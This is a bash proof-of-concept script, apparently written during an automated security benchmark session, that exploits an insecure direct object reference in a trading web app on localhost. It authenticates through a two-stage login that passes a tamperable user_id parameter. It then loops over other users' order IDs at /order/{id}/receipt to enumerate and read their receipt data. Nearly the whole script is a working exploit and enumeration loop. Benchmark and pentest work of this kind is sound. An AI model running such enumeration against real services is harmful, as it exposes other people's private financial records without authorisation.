#!/bin/bash
# POC: POC v3 using two-stage authentication flow that properly authenticates before testing order endpoints
# Target: ./repo
# Created: 2025-11-07T18:46:58.720Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# IDOR - Mass Order Enumeration and Unauthorized Access to Receipt Data (v3)
# This POC uses the two-stage login flow discovered in existing vulnerabilities

TARGET_URL="http://localhost:8082"
COOKIES_FILE="/tmp/idor_cookies_v3.txt"

echo "[*] IDOR Vulnerability POC - Order Receipt Enumeration (v3)"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Get initial cookies/form
echo "[+] Step 1: Initializing session..."
curl -s -c "$COOKIES_FILE" "$TARGET_URL/" > /dev/null
echo "[+] Session initialized"
echo ""

# Step 2: Two-stage authentication (from existing vulnerability)
# Stage 1: Submit username to /password/{username}
echo "[+] Step 2: Two-stage authentication - Stage 1 (username)..."
USERNAME="testuser"
RESPONSE=$(curl -s -b "$COOKIES_FILE" -c "$COOKIES_FILE" "$TARGET_URL/password/$USERNAME")

# Check for indication of user existence
if echo "$RESPONSE" | grep -q "form\|password"; then
    echo "[+] Stage 1 successful - form received"
else
    echo "[-] Stage 1 response: $(echo "$RESPONSE" | head -c 200)"
fi

# Stage 2: Submit password with user_id (vulnerable parameter)
echo "[+] Step 3: Two-stage authentication - Stage 2 (password)..."
PASSWORD="testpass"
USER_ID="1"  # Test with default user_id

RESPONSE=$(curl -s -b "$COOKIES_FILE" -c "$COOKIES_FILE" -X POST "$TARGET_URL/" \
  -d "username=$USERNAME&password=$PASSWORD&user_id=$USER_ID" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -q "dashboard\|order\|receipt"; then
    echo "[+] Authentication appears successful"
elif echo "$RESPONSE" | grep -q "Redirecting"; then
    echo "[+] Got redirect - may be authenticated, checking cookies..."
    grep -i "session\|token" "$COOKIES_FILE" && echo "[+] Session cookie found" || echo "[?] No session cookie visible"
else
    echo "[!] Response: $(echo "$RESPONSE" | head -c 300)"
fi

echo ""

# Step 4: Now attempt to access order receipts
echo "[+] Step 4: Accessing order receipt endpoint with authenticated session..."
echo ""

# Test authorized order
echo "[*] Testing authorized order (300123)..."
RESPONSE=$(curl -s -w "\n%{http_code}" -L -b "$COOKIES_FILE" "$TARGET_URL/order/300123/receipt")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] Got HTTP 200 response"
    echo "[*] Contains order ID: $(echo "$BODY" | grep -qE "300123|Order.*ID" && echo 'YES' || echo 'NO')"
    echo "[*] Contains SPY ticker: $(echo "$BODY" | grep -q "SPY" && echo 'YES' || echo 'NO')"
    echo "[*] Response sample (first 400 chars):"
    echo "$BODY" | head -c 400 | sed 's/^/    /'
    echo ""
    echo ""
else
    echo "[*] HTTP $HTTP_CODE received"
fi

# Test unauthorized orders
echo "[+] Step 5: Testing unauthorized order enumeration..."
echo ""

TEST_IDS=(300124 300125 300126 300127 300128 300130 300150 300200)
UNAUTHORIZED_200=0
PROPER_CONTROL=0

for ORDER_ID in "${TEST_IDS[@]}"; do
    RESPONSE=$(curl -s -w "\n%{http_code}" -L -b "$COOKIES_FILE" "$TARGET_URL/order/$ORDER_ID/receipt")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    if [ "$HTTP_CODE" = "200" ]; then
        UNAUTHORIZED_200=$((UNAUTHORIZED_200 + 1))
        # Check if empty or contains data
        BODY_SIZE=${#BODY}
        if echo "$BODY" | grep -qE "Amount|Ticker|Price|SPY|BUY|SELL"; then
            echo "[VULNERABLE] Order $ORDER_ID: HTTP 200 WITH DATA (size: $BODY_SIZE chars)"
        else
            echo "[VULNERABLE] Order $ORDER_ID: HTTP 200 EMPTY RESPONSE (size: $BODY_SIZE chars)"
        fi
    elif [ "$HTTP_CODE" = "403" ] || [ "$HTTP_CODE" = "404" ]; then
        PROPER_CONTROL=$((PROPER_CONTROL + 1))
        echo "[OK] Order $ORDER_ID: HTTP $HTTP_CODE - Proper access control"
    else
        echo "[?] Order $ORDER_ID: HTTP $HTTP_CODE"
    fi
done

echo ""
echo "[*] IDOR Test Results:"
echo "    Unauthorized orders with HTTP 200: $UNAUTHORIZED_200 out of ${#TEST_IDS[@]}"
echo "    Proper 403/404 responses: $PROPER_CONTROL out of ${#TEST_IDS[@]}"
echo ""

# Step 6: Test some known owned orders from evidence
echo "[+] Step 6: Checking known owned orders..."
OWNED=(300214 300327 300481)

for ORDER_ID in "${OWNED[@]}"; do
    RESPONSE=$(curl -s -w "\n%{http_code}" -L -b "$COOKIES_FILE" "$TARGET_URL/order/$ORDER_ID/receipt")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    if [ "$HTTP_CODE" = "200" ]; then
        if echo "$BODY" | grep -qE "Amount|Ticker"; then
            echo "[OWNED] Order $ORDER_ID: HTTP 200 with trading data"
        else
            echo "[OWNED] Order $ORDER_ID: HTTP 200"
        fi
    else
        echo "[?] Order $ORDER_ID: HTTP $HTTP_CODE"
    fi
done

echo ""
echo "[+] Summary:"
if [ $UNAUTHORIZED_200 -gt 0 ]; then
    echo "[!] IDOR VULNERABILITY CONFIRMED"
    echo "[!] Unauthorized orders return HTTP 200 instead of 403/404"
    echo "[!] Mass enumeration is possible"
    exit 0
else
    echo "[!] POSSIBLE FIXED VULNERABILITY: No HTTP 200 for unauthorized orders"
    echo "[!] Access control may have been properly implemented"
    exit 1
fi